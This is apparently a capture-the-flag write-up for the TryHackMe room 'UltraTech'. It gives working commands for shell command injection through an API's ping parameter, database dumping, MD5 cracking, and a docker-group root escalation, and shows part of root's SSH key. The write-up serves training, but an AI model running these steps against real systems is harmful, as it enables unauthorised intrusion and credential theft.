# UltraTech

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | https://tryhackme.com/room/ultratech1 |
| **Focus** | Unsanitized API parameter enables OS command injection via a DNS-error exfiltration channel, followed by Docker-group privilege escalation |

---

## Port Scan `[RECON]`

```bash
nmap -sS -sC -sV -O -A -p 21,22,8081,31331 <TARGET_IP> -oN nmap.txt

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Four open ports: FTP, SSH, a Node.js REST API (8081), and an Apache web server (31331).

---

## REST API Enumeration `[ENUMERATION]`

```bash
curl http://<TARGET_IP>:8081

UltraTech API v0.1.3
```

```bash
gobuster dir -u http://<TARGET_IP>:8081/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 400,403,404

/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
```

The API exposes two routes: `/auth` and `/ping`.

---

## Web Server and Frontend Analysis `[ENUMERATION]`

```bash
gobuster dir -u http://<TARGET_IP>:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 400,403,404

/js                   (Status: 301) [Size: 312] [--> http://<TARGET_IP>:31331/js/]
```

`http://<TARGET_IP>:31331/js/api.js` reveals:

```javascript
function checkAPIStatus() {
    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
    // checks every 10 seconds that the API is active
}
checkAPIStatus()
const interval = setInterval(checkAPIStatus, 10000);
const form = document.querySelector('form')
form.action = `http://${getAPIURL()}/auth`;
```

The frontend consumes two API routes: `/ping?ip=` (automatic healthcheck every 10 seconds) and `/auth` (login form on `partners.html`).

---

## Command Injection Confirmation in `/ping` `[EXPLOITATION]`

```bash
curl "http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>'"

/bin/sh: 1: Syntax error: Unterminated quoted string
```

The shell syntax error confirms the `ip` parameter is passed directly to `/bin/sh` without sanitization.

---

## Command Execution via Backticks `[EXPLOITATION]`

```bash
curl "http://<TARGET_IP>:8081/ping?ip=\`id\`"

ping: groups=1002(www): Name or service not known
```

```bash
curl "http://<TARGET_IP>:8081/ping?ip=\`ls\`"

ping: utech.db.sqlite: Name or service not known
```

The server executes `id` and `ls` — the process runs as `www`. A SQLite database, `utech.db.sqlite`, is identified in the working directory.

> **Note:** Backticks are a shell construct that executes the enclosed command and substitutes its output where they appear. Injecting them as the value of the `ip` parameter makes the server run the inner command first and use its result as the argument to `ping`. They are escaped with `\` so the local shell doesn't interpret them before the request is sent.

---

## Database Extraction `[EXPLOITATION]`

When the injected command's output contains spaces or special characters, curl rejects the URL. `--data-urlencode` delegates the encoding to the client:

```bash
curl -g -G "http://<TARGET_IP>:8081/ping" --data-urlencode "ip=\`cat utech.db.sqlite\`"

���(r00t<HASH>)admin<HASH>: Name or service not known
```

MD5 hashes obtained:

| User | MD5 Hash |
|------|----------|
| `r00t` | `<HASH>` |
| `admin` | `<HASH>` |

---

## MD5 Hash Cracking `[EXPLOITATION]`

```bash
hashcat -m 0 r00t_hash.txt /usr/share/wordlists/rockyou.txt --show

<HASH>:<PASSWORD>
```

```bash
hashcat -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt --show

<HASH>:<PASSWORD>
```

Credentials obtained: `r00t:<PASSWORD>` and `admin:<PASSWORD>`.

---

## API Credential Verification `[EXPLOITATION]`

```bash
curl "http://<TARGET_IP>:8081/auth?login=r00t&password=<PASSWORD>"

Restricted area
Hey r00t, can you please have a look at the server's configuration?
```

Both credentials are valid against the API. The message references the `r00t` user.

---

## SSH Access `[EXPLOITATION]`

```bash
ssh r00t@<TARGET_IP>
# password: <PASSWORD>

r00t@<TARGET_IP>:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Access as `r00t`. The user belongs to the `docker` group.

---

## Privilege Enumeration `[PRIVESC]`

```bash
sudo -l

Sorry, user r00t may not run sudo on <TARGET_IP>.
```

No sudo privileges. However, membership in the `docker` group allows privilege escalation by mounting the host filesystem inside a container.

---

## Docker Group Privilege Escalation `[PRIVESC]`

```bash
docker images

REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   7 years ago   15.8MB
```

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

The command mounts the host's root filesystem at `/mnt` inside the container and runs `chroot` to operate as root on the real host.

---

## Root SSH Private Key Extraction `[POST-EXPLOITATION]`

```bash
# Inside the container (host filesystem access)
cat /root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
[...]
-----END RSA PRIVATE KEY-----
```

Root's RSA private key is accessible from inside the container, giving full host access.

---

## Attack Chain

```mermaid
graph TD
    A["Recon\nnmap 4 ports"] --> B["Web enumeration\ngobuster ports 31331 and 8081"]
    B --> C["JavaScript analysis\napi.js - ping and auth routes"]
    C --> D["Command injection\nunsanitized ip parameter"]
    D --> E["Command execution\nbackticks - ls, id, cat"]
    E --> F["DB extraction\nutech.db.sqlite via --data-urlencode"]
    F --> G["MD5 hashes\nr00t and admin"]
    G --> H["hashcat cracking\nrockyou.txt"]
    H --> I["SSH access\nr00t - docker group"]
    I --> J["Docker privesc\nbash image - chroot /mnt"]
    J --> K["Root on host\nuid=0"]
```

---

## Key Concepts

**Command Injection via API Parameter**

The `/ping` endpoint builds a shell command by directly concatenating user input: `ping <ip_value>`. Injecting backticks makes the shell execute the enclosed command first and use its output as the argument to `ping`. The server then tries to resolve that result as a hostname, leaking its content in `ping`'s own DNS resolution error — an unintended exfiltration channel.

**Docker Group as a Root-Equivalent Privilege**

Belonging to the `docker` group is functionally equivalent to root access on the host. A member of the group can launch containers with `-v /:/mnt`, mounting the entire host filesystem. Combined with `chroot`, this yields a `uid=0` shell with full access to the real system, without touching sudo or any kernel vulnerability.

---

## Lessons Learned

- Group membership like `docker` should be treated with the same level of restriction as sudo access, since it provides a direct path to root on the host with no additional protection.
